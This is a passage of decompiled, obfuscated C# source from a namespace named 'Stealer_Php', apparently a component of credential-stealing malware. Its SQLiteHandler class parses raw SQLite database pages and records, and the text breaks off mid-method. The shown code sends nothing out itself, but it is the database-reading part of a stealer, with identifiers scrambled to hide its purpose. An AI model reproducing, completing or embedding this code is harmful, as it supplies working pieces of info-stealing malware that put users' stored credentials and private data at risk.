using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stealer_Php;

public class SQLiteHandler
{
	private struct ZN6nysfuVqOR0ejmUpTovsRkKAejmUpTovsRkKAWBHCRGH6tAJyARXvtbU56WbuA
	{
		public long size;

		public long type;
	}

	private struct RXvtbU56WbuG1nzSEWGpv3BfXAqKtJMrgwUmaoAqKtJMrgwUmaoA4Qcftfc7gMz0
	{
		public long row_id;

		public string[] content;
	}

	private struct Struct0
	{
		public long row_id;

		public string item_type;

		public string item_name;

		public string astable_name;

		public long root_num;

		public string sql_statement;
	}

	private byte[] rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA;

	private ushort VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0;

	private ulong j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA;

	private Struct0[] rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0;

	private byte[] EXLuokt7J1V94uArFHXBKXeuo0pK8K760KuCD5ApK8K760KuCD5ANoigrXl7rQaA;

	private RXvtbU56WbuG1nzSEWGpv3BfXAqKtJMrgwUmaoAqKtJMrgwUmaoA4Qcftfc7gMz0[] S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0;

	private string[] bRO6OJF9i8Uq6gNdCEX39sjl70gNdCEX39sjl7AUE7YxJQMhJoOAPBnEoueM4tPA;

	private ushort IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(ushort z8xCkmIaQOlX0D0YYMaxmyzK9AIxQdD8qnbZt3AIxQdD8qnbZt3AqSixwaPbN8gA)
	{
		return checked((ushort)(((z8xCkmIaQOlX0D0YYMaxmyzK9AIxQdD8qnbZt3AIxQdD8qnbZt3AqSixwaPbN8gA & 0xFF) << 8) | ((z8xCkmIaQOlX0D0YYMaxmyzK9AIxQdD8qnbZt3AIxQdD8qnbZt3AqSixwaPbN8gA & 0xFF00) >> 8)));
	}

	private uint i94Dx0jykSoP4X0mZ8SN9YRk2AbyFeN1D9EAULAbyFeN1D9EAULAZScyjpwyScuA(uint mmf1n9abNkZA0mmf1n9abNkZAASFqOUxXnbKyGAWaV3dZLQzu8aAWaV3dZLQzu8A)
	{
		checked
		{
			return (uint)(unchecked((long)((((ulong)mmf1n9abNkZA0mmf1n9abNkZAASFqOUxXnbKyGAWaV3dZLQzu8aAWaV3dZLQzu8A & 0xFFuL) << 24) | (((ulong)mmf1n9abNkZA0mmf1n9abNkZAASFqOUxXnbKyGAWaV3dZLQzu8aAWaV3dZLQzu8A & 0xFF00uL) << 8)) | ((long)((ulong)mmf1n9abNkZA0mmf1n9abNkZAASFqOUxXnbKyGAWaV3dZLQzu8aAWaV3dZLQzu8A & 0xFF0000uL) >> 8)) | ((mmf1n9abNkZA0mmf1n9abNkZAASFqOUxXnbKyGAWaV3dZLQzu8aAWaV3dZLQzu8A & -16777216L) >> 24));
		}
	}

	private ulong UnP2ZRmzpBEu5UnP2ZRmzpBEuAkFSOiDVBwmaZAQbZ4qRfBZLaTAQbZ4qRfBZLa0(ulong d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA)
	{
		return checked((ulong)((((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFFL) << 56) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFF00L) << 40) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFF0000L) << 24) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFF000000L) << 8) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFF00000000L) >> 8) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFF0000000000L) >> 24) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & 0xFF000000000000L) >> 40) | (((long)d2yRULucQVeD0ZN1VJZuLO3V6AZN1VJZuLO3V6AfroqwLAQ923mAkBBXswXoaFpA & -72057594037927936L) >> 56)));
	}

	private int method_0(int kBBXswXoaFp20PggGAkaAmEPJA0LLwXKOAoPocA0LLwXKOAoPocAsUWIa7rodOlA)
	{
		if (kBBXswXoaFp20PggGAkaAmEPJA0LLwXKOAoPocA0LLwXKOAoPocAsUWIa7rodOlA > rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA.Length)
		{
			return 0;
		}
		checked
		{
			int num = kBBXswXoaFp20PggGAkaAmEPJA0LLwXKOAoPocA0LLwXKOAoPocAsUWIa7rodOlA + 8;
			int num2 = kBBXswXoaFp20PggGAkaAmEPJA0LLwXKOAoPocA0LLwXKOAoPocAsUWIa7rodOlA;
			while (true)
			{
				if (num2 <= num)
				{
					if (num2 <= rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA.Length - 1)
					{
						if ((rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[num2] & 0x80) != 128)
						{
							break;
						}
						num2++;
						continue;
					}
					return 0;
				}
				return kBBXswXoaFp20PggGAkaAmEPJA0LLwXKOAoPocA0LLwXKOAoPocAsUWIa7rodOlA + 8;
			}
			return num2;
		}
	}

	private long xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0(int wPWMPKxp8bU80wPWMPKxp8bU8A9H0jp730LatQAFEgOzkU0l8E5AFEgOzkU0l8EA, int t4975XdpwlZM1o1ooR6TqeJafAo1ooR6TqeJafAOWK9gXo1Ru8IATqyEX6y1KVuA)
	{
		checked
		{
			t4975XdpwlZM1o1ooR6TqeJafAo1ooR6TqeJafAOWK9gXo1Ru8IATqyEX6y1KVuA++;
			byte[] array = new byte[8];
			int num = t4975XdpwlZM1o1ooR6TqeJafAo1ooR6TqeJafAOWK9gXo1Ru8IATqyEX6y1KVuA - wPWMPKxp8bU80wPWMPKxp8bU8A9H0jp730LatQAFEgOzkU0l8E5AFEgOzkU0l8EA;
			bool flag = false;
			if (unchecked(num == 0 || num > 9))
			{
				return 0L;
			}
			switch (num)
			{
			case 1:
				array[0] = (byte)(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[wPWMPKxp8bU80wPWMPKxp8bU8A9H0jp730LatQAFEgOzkU0l8E5AFEgOzkU0l8EA] & 0x7F);
				return BitConverter.ToInt64(array, 0);
			case 9:
				flag = true;
				break;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[t4975XdpwlZM1o1ooR6TqeJafAo1ooR6TqeJafAOWK9gXo1Ru8IATqyEX6y1KVuA - 1];
				t4975XdpwlZM1o1ooR6TqeJafAo1ooR6TqeJafAOWK9gXo1Ru8IATqyEX6y1KVuA--;
				num4 = 1;
			}
			for (int i = t4975XdpwlZM1o1ooR6TqeJafAo1ooR6TqeJafAOWK9gXo1Ru8IATqyEX6y1KVuA - 1; i >= wPWMPKxp8bU80wPWMPKxp8bU8A9H0jp730LatQAFEgOzkU0l8E5AFEgOzkU0l8EA; i += -1)
			{
				if (i - 1 >= wPWMPKxp8bU80wPWMPKxp8bU8A9H0jp730LatQAFEgOzkU0l8E5AFEgOzkU0l8EA)
				{
					array[num4] = (byte)unchecked(((byte)((uint)rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[i] >> (checked(num2 - 1) & 7)) & (255 >> num2)) | (byte)(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[checked(i - 1)] << (num3 & 7)));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)(unchecked((byte)((uint)rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[i] >> (checked(num2 - 1) & 7))) & (255 >> num2));
				}
			}
			return BitConverter.ToInt64(array, 0);
		}
	}

	private bool lRQNCcJDc1JS8lRQNCcJDc1JSAUHikvOw0Q0V4AYEePmcs1nCfzAYEePmcs1nCfA(long TqyEX6y1KVuC0gJVbku6qY4VqAcfqGtWPrvgk7AcfqGtWPrvgk7Ac6fACJg2qFpA)
	{
		return (TqyEX6y1KVuC0gJVbku6qY4VqAcfqGtWPrvgk7AcfqGtWPrvgk7Ac6fACJg2qFpA & 1L) == 1L;
	}

	private ulong c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(int hTii2WW2SpOh0hTii2WW2SpOhATvQ1nJlr6RoLANGY6dtvsXAJFANGY6dtvsXAJA, int pkxTei93jcUt1t3N8QIA3r9fBAt3N8QIA3r9fBA7YrVJ4ksg8ESACV7a8IZt5LzA)
	{
		if (pkxTei93jcUt1t3N8QIA3r9fBAt3N8QIA3r9fBA7YrVJ4ksg8ESACV7a8IZt5LzA > 8 || pkxTei93jcUt1t3N8QIA3r9fBAt3N8QIA3r9fBA7YrVJ4ksg8ESACV7a8IZt5LzA == 0)
		{
			return 0uL;
		}
		ulong num = 0uL;
		checked
		{
			int num2 = pkxTei93jcUt1t3N8QIA3r9fBAt3N8QIA3r9fBA7YrVJ4ksg8ESACV7a8IZt5LzA - 1;
			for (int i = 0; i <= num2; i++)
			{
				num = (num << 8) | rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[hTii2WW2SpOh0hTii2WW2SpOhATvQ1nJlr6RoLANGY6dtvsXAJFANGY6dtvsXAJA + i];
			}
			return num;
		}
	}

	private void mq1FINN2nZfUBNKocxBtFzXt6A2fCHrNvFc521A2fCHrNvFc521Au7f0OB12OilA(ulong CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA)
	{
		checked
		{
			if (rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[(int)CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA] == 13)
			{
				ushort num = (ushort)(unchecked((int)IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(3L)))))) - 1);
				int num2 = 0;
				if (rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0 != null)
				{
					num2 = rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0.Length - 1;
					rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0 = (Struct0[])Utils.CopyArray((Array)rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0, (Array)new Struct0[rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0.Length - 1 + unchecked((int)num) + 1]);
				}
				else
				{
					rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0 = new Struct0[unchecked((int)num) + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(8L)), new decimal(i * 2)))));
					if (decimal.Compare(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(100L)) != 0)
					{
						num4 += CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA;
					}
					int num5 = method_0((int)num4);
					xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0((int)num4, num5);
					int num6 = method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].row_id = xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = method_0((int)num4);
					num6 = num5;
					long value = xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0((int)num4, num5);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = method_0(num5);
						array[num7] = xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0(num5, num6);
						if (array[num7] <= 9L)
						{
							array[num7] = EXLuokt7J1V94uArFHXBKXeuo0pK8K760KuCD5ApK8K760KuCD5ANoigrXl7rQaA[(int)array[num7]];
						}
						else if (lRQNCcJDc1JS8lRQNCcJDc1JSAUHikvOw0Q0V4AYEePmcs1nCfzAYEePmcs1nCfA(array[num7]))
						{
							array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
						}
						else
						{
							array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
						}
						num7++;
					}
					while (num7 <= 4);
					if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), 1m) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].item_type = Encoding.Default.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(2L)) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].item_type = Encoding.Unicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(3L)) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), 1m) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].item_name = Encoding.Default.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(2L)) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].item_name = Encoding.Unicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(3L)) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].root_num = (long)c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), 1m) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].sql_statement = Encoding.Default.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(2L)) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].sql_statement = Encoding.Unicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(j5q0uwxI77U62j5q0uwxI77U60RbfNBl75K62mAAuhT0LO6kJo2AAuhT0LO6kJoA), new decimal(3L)) == 0)
					{
						rOoQm7iJwHOJ3vjXVcLXJfUpc0vjXVcLXJfUpcA8CyDf7k6STkFAEXLuokt7J1V0[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
				}
			}
			else
			{
				if (rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[(int)CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA] != 5)
				{
					return;
				}
				ushort num8 = (ushort)(unchecked((int)IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(3L)))))) - 1);
				int num9 = num8;
				for (int j = 0; j <= num9; j++)
				{
					ushort num10 = IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(12L)), new decimal(j * 2)))));
					if (decimal.Compare(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(100L)) == 0)
					{
						mq1FINN2nZfUBNKocxBtFzXt6A2fCHrNvFc521A2fCHrNvFc521Au7f0OB12OilA(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(num10, 4)), 1m), new decimal(VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0))));
					}
					else
					{
						mq1FINN2nZfUBNKocxBtFzXt6A2fCHrNvFc521A2fCHrNvFc521Au7f0OB12OilA(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0((int)(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA + num10), 4)), 1m), new decimal(VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0))));
					}
				}
				mq1FINN2nZfUBNKocxBtFzXt6A2fCHrNvFc521A2fCHrNvFc521Au7f0OB12OilA(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(c4r8VOOEbBDe9X1UpfzZEBNzYAX1UpfzZEBNzYAhXxBTnY1NMZBAmq1FINN2nZf0(Convert.ToInt32(decimal.Add(new decimal(CV7a8IZt5Lzk0wLjus4i4IKaNArIIcjhr4iXfHArIIcjhr4iXfHAL8ZKXUDttWuA), new decimal(8L))), 4)), 1m), new decimal(VVpaSZSHZQaA1fMLvfLe4lOzH0aIzLWZU5px7aAaIzLWZU5px7aAe9VLlMnIeZf0))));
			}
		}
	}

	private bool yTMiYnW3MHObCyTMiYnW3MHObACwV2ZabGasPEAHGW6O9RGySkXAHGW6O9RGySk0(ulong P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA)
	{
		checked
		{
			if (rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA[(int)P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA] == 13)
			{
				ushort num = (ushort)(unchecked((int)IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(new decimal(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA), new decimal(3L)))))) - 1);
				int num2 = 0;
				if (S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0 != null)
				{
					num2 = S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0.Length - 1;
					S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0 = (RXvtbU56WbuG1nzSEWGpv3BfXAqKtJMrgwUmaoAqKtJMrgwUmaoA4Qcftfc7gMz0[])Utils.CopyArray((Array)S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0, (Array)new RXvtbU56WbuG1nzSEWGpv3BfXAqKtJMrgwUmaoAqKtJMrgwUmaoA4Qcftfc7gMz0[S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0.Length - 1 + unchecked((int)num) + 1]);
				}
				else
				{
					S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0 = new RXvtbU56WbuG1nzSEWGpv3BfXAqKtJMrgwUmaoAqKtJMrgwUmaoA4Qcftfc7gMz0[unchecked((int)num) + 1];
				}
				int num3 = num;
				ZN6nysfuVqOR0ejmUpTovsRkKAejmUpTovsRkKAWBHCRGH6tAJyARXvtbU56WbuA[] array = default(ZN6nysfuVqOR0ejmUpTovsRkKAejmUpTovsRkKAWBHCRGH6tAJyARXvtbU56WbuA[]);
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = IPu5d2s8F42a3NMRBTej8fHprANMRBTej8fHprAmDuXQSYxqGOWAi94Dx0jykSo0(BitConverter.ToUInt16(rl0Urap3o1I90Q3g8y9y4Pdu30Q3g8y9y4Pdu3ARZBW4x4H8DfjAVVpaSZSHZQaA, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA), new decimal(8L)), new decimal(i * 2)))));
					if (decimal.Compare(new decimal(P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA), new decimal(100L)) != 0)
					{
						num4 += P5T0h32uh32E0P5T0h32uh32EAjaOMPVn5UgkVAfudSF3c5HFOnAfudSF3c5HFOA;
					}
					int num5 = method_0((int)num4);
					xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0((int)num4, num5);
					int num6 = method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					S8JMi6b8TNZf5S8JMi6b8TNZf0hdY4ZvhL5y7IAdaTniWqLWZtCAdaTniWqLWZt0[num2 + i].row_id = xCsYgCoCxhkw7FgOGbASAmHobAKAwxlDc0ArOWAKAwxlDc0ArOWAoUYILAVDCTp0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = method_0((int)num4);
					num6 = num5;
